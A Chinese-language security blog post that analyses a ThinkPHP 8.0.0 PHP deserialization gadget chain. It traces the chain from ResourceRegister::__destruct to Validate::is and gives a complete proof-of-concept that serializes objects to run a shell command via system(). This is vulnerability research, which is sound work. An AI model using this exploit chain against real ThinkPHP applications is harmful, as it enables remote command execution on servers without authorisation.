---
title: "PHP反序列化——Thinkphp8.0.0反序列化链分析"
description: "ThinkPHP 8.0.0 反序列化链分析。"
publishDate: "2025-09-29T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "thinkphp"]
---
## POP链路

```php
src/think/route/ResourceRegister.php::__destruct()
        | $this->register()
        | $this->resource->parseGroupRule($this->resource->getRule());
        vendor/topthink/think-orm/src/model/concern/Conversion.php::__toString()
            | toJson()
            | toArray()
            | appendAttrToArray(array &$item, $key, array | string $name, array $visible, array $hidden)
            | getRelationWith(string $key, array $hidden, array $visible)
                $relation->visible($visible[$key]);
                vendor/topthink/think-validate/src/Validate.php::__call($method, $args)
                    call_user_func_array([$this, 'is'], $args);
                    is($value, string $rule, array $data = [])
                    
                
       
        

```

## 漏洞分析


寻找漏洞入口，vendor/topthink/framework/src/think/route/ResourceRegister.php的\_\_destruct函数



```php
public function __destruct()
{
    if (!$this->registered) {
        $this->register();
    }
}
```

跟进rigister函数

```php
protected function register()
{
    $this->registered = true;
    
    $this->resource->parseGroupRule($this->resource->getRule());
}
```

这里分析，无法通过$this->resource->getRule()去实现\_\_toString链路，因为这里传参为空，不可控制参数

```php
public function getRule()
{
    return $this->rule;
}
```



到vendor/topthink/framework/src/think/route/Resource.php，进一步分析 parseGroupRule($rule)

```php
public function parseGroupRule($rule): void
{
    $option = $this->option;
    $origin = $this->router->getGroup();
    $this->router->setGroup($this);

    if (str_contains($rule, '.')) {
        // 注册嵌套资源路由
        $array = explode('.', $rule);
        $last  = array_pop($array);
        $item  = [];

        foreach ($array as $val) {
            $item[] = $val . '/<' . ($option['var'][$val] ?? $val . '_id') . '>';
        }

        $rule = implode('/', $item) . '/' . $last;
        $id   = $option['var'][$last] ?? 'id';
    } else {
        $id = $option['var'][$rule] ?? 'id';
    }

    $prefix = substr($rule, strlen($this->name) + 1);

    // 注册资源路由
    foreach ($this->rest as $key => $val) {
        if ((isset($option['only']) && !in_array($key, $option['only']))
            || (isset($option['except']) && in_array($key, $option['except']))
        ) {
            continue;
        }

        if (str_contains($val[1], '<id>') && 'id' != $id) {
            $val[1] = str_replace('<id>', '<' . $id . '>', $val[1]);
        }

        $ruleItem = $this->addRule(trim($prefix . $val[1], '/'), $this->route . '/' . $val[2], $val[0]);

        foreach (['model', 'validate', 'middleware', 'pattern'] as $name) {
            if (isset($this->$name[$key])) {
                call_user_func_array([$ruleItem, $name], (array) $this->$name[$key]);
            }
        }
    }

    if ($this->extend) {
        // 扩展路由规则
        $group = new RuleGroup($this->router, $this, $prefix . '/<' . $id . '>');
        $this->router->setGroup($group);
        Container::getInstance()->invokeFunction($this->extend);
    }

    $this->router->setGroup($origin);
    $this->hasParsed = true;
}
```



这里存在很多拼接

```php
foreach ($array as $val) {
            $item[] = $val . '/<' . ($option['var'][$val] ?? $val . '_id') . '>';
        }
```

将$option\['var']\[$val]可控，设置为一个实例化对象，这里设置为Pivot对象，这样可以进入到

vendor/topthink/think-orm/src/model/concern/Conversion.php类的\_\_toString魔术方法，可参考thinkphp5.1.37文章

```php
public function __toString()
{
    return $this->toJson();
}


public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
{
    return json_encode($this->toArray(), $options);
}


```



```php
public function toArray(): array
{
    $item = $visible = $hidden = [];

    $hasVisible = false;

    foreach ($this->visible as $key => $val) {
        if (is_string($val)) {
            if (str_contains($val, '.')) {
                [$relation, $name]    = explode('.', $val);
                $visible[$relation][] = $name;
            } else {
                $visible[$val] = true;
                $hasVisible    = true;
            }
        } else {
            $visible[$key] = $val;
        }
    }

    foreach ($this->hidden as $key => $val) {
        if (is_string($val)) {
            if (str_contains($val, '.')) {
                [$relation, $name]   = explode('.', $val);
                $hidden[$relation][] = $name;
            } else {
                $hidden[$val] = true;
            }
        } else {
            $hidden[$key] = $val;
        }
    }

    // 追加属性（必须定义获取器）
    foreach ($this->append as $key => $name) {
        $this->appendAttrToArray($item, $key, $name, $visible, $hidden);//$key, $name, $hidden //$name is array
    }
    
    ……
```



这部分exp

```php
<?php


namespace think\route
{
    abstract class Rule
    {
        protected $rule;
        public function __construct(){
            $this->rule = "1.1";
        }
    }
}

namespace think\route{
    class RuleGroup extends Rule{}
}

namespace think\model
{
    use think\Model;

    class Pivot
    {

    }
}

namespace think\route{

    use think\model\Pivot;
    use think\Route;

    class Resource extends RuleGroup
    {
        protected $option = [];
        protected $rule;
        public function __construct(){
            parent::__construct();
            $this->option = ["var"=>["1"=>new Pivot()]];
        }
    }
}


namespace think\route {

    class ResourceRegister
    {
        protected $resource;
        public function __construct(){

            $this->resource = new Resource();
        }
    }

}
namespace think\route {
$aa= new ResourceRegister();
echo base64_encode(serialize($aa))."\r\n";
echo serialize($aa);
}
```



进入到 toArray函数，之后分析函数流，进入appendAttrToArray方法

控制参数

* `$key, $hidden, $visible`

* `is_array($name)`

```php
protected function appendAttrToArray(array &$item, $key, array | string $name, array $visible, array $hidden): void
{
    if (is_array($name)) {
        // 批量追加关联对象属性
        $relation   = $this->getRelationWith($key, $hidden, $visible);
        $item[$key] = $relation ? $relation->append($name)->toArray() : [];
    } elseif (str_contains($name, '.')) {
        // 追加单个关联对象属性
        [$key, $attr] = explode('.', $name);
        $relation     = $this->getRelationWith($key, $hidden, $visible);
        $item[$key]   = $relation ? $relation->append([$attr])->toArray() : [];
    } else {
        $value       = $this->getAttr($name);
        $item[$name] = $value;

        $this->getBindAttrValue($name, $value, $item);
    }
}
```



控制函数进入

```php
$relation   = $this->getRelationWith($key, $hidden, $visible);
```



```php
protected function getRelationWith(string $key, array $hidden, array $visible)
{
    $relation = $this->getRelation($key, true);
    if ($relation) { //validate
        if (isset($visible[$key])) {
            $relation->visible($visible[$key]);
        } elseif (isset($hidden[$key])) {
            $relation->hidden($hidden[$key]);
        }
    }
    return $relation;
}
```

这里关键利用点$relation->visible($visible\[$key]);，利用类调用不存在的方法跳转到\_call

这里给分析$relation赋值过程，发现源自Model类的relation，即Pivot类给它赋值为\["a"=>new Validate()];

跳转到\_call

```bash
public function __call($method, $args) //$visible[$key]
{
    if ('is' == strtolower(substr($method, 0, 2))) {
        $method = substr($method, 2);
    }

    array_push($args, lcfirst($method));//args add is

    return call_user_func_array([$this, 'is'], $args);
}
```

进入到is函数

```php
public function is($value, string $rule, array $data = []): bool
{
    $call = function ($value, $rule) {
        if(isset($this->type[$rule])) {
            $result = call_user_func_array($this->type[$rule], $value]);
        }
 ……
```

关键点call\_user\_func\_array($this->type\[$rule], \[$value])

这里大佬们将value设置为new ConstStub()，调用的toString函数，返回字符参数，实现命令执行。



## POC

```php
<?php
namespace Symfony\Component\VarDumper\Caster{

    use Symfony\Component\VarDumper\Cloner\Stub;

    class ConstStub
    {
        public $value;
        public function __construct(){
            $this->value = "whoami";
        }

    }
}

namespace think{
    use Symfony\Component\VarDumper\Caster\ConstStub;
    class Validate
    {
        protected $type = []; //rule
        public function __construct(){
            $this->type = ["visible"=>"system"];

        }

    }
    abstract class Model{
        protected $append = [];
        private $relation = [];
        protected $visible = [];
        public function __construct(){
            $this->append = ["a"=>["1.1"]];
            $this->relation = ["a"=>new Validate()];
            $this->visible = ["a"=>new ConstStub()];

        }
    }
}


namespace think\route
{
    abstract class Rule
    {
        protected $rule;
        public function __construct(){
            $this->rule = "1.1";
        }
    }
}

namespace think\route{
    class RuleGroup extends Rule{}
}

namespace think\model
{
    use think\Model;

    class Pivot extends Model
    {

    }
}

namespace think\route{

    use think\model\Pivot;
    use think\Route;

    class Resource extends RuleGroup
    {
        protected $option = [];
        protected $rule;
        public function __construct(){
            parent::__construct();
            $this->option = ["var"=>["1"=>new Pivot()]];
        }
    }
}


namespace think\route {

    class ResourceRegister
    {
        protected $resource;
        public function __construct(){

            $this->resource = new Resource();
        }
    }

}
namespace think\route {
$aa= new ResourceRegister();
echo base64_encode(serialize($aa))."\r\n";
echo serialize($aa);
}
```



### 为什么传 new ConstStub() 会进入 toString

* 在真实链路中（ThinkPHP 的 Validate::is() → call\_user\_func\_array($this->type\[$rule], \[$value])），当 $this->type\['visible'] === 'system' 时会调用 system($value)。

* system() 期望字符串。PHP 遇到“需要字符串却传了对象”时，会尝试调用该对象的 \_\_toString() 做隐式转换。

* Symfony VarDumper 的 ConstStub 继承自 Stub，实际实现了 \_\_toString()（或等效返回 $this->value）。因此 $value 是对象时，会先走到 \_\_toString()，把你在对象里塞的命令字符串取出来，再传给 system() 执行。



Reference：
----------

https://gowninng.cn/archives/thinkphp8fan-xu-lie-hua-fu-xian

https://doc.thinkphp.cn/v8\_0/setup.html

https://www.aiwin.net.cn/index.php/archives/4422/

https://blog.takake.com/posts/17013/

https://www.cnblogs.com/Litsasuk/articles/18402105

[phpstorm配置xdebug 3.0最新教程！！！配置不成功的快看！](https://www.cnblogs.com/beidaxmf/p/14527335.html)

[PHP Xdebug3 + VS Code 新版配置踩坑](https://blog.csdn.net/Zheng__Huang/article/details/126452990) #(xdebug3配置参考这个)

&#x20;&#x20;

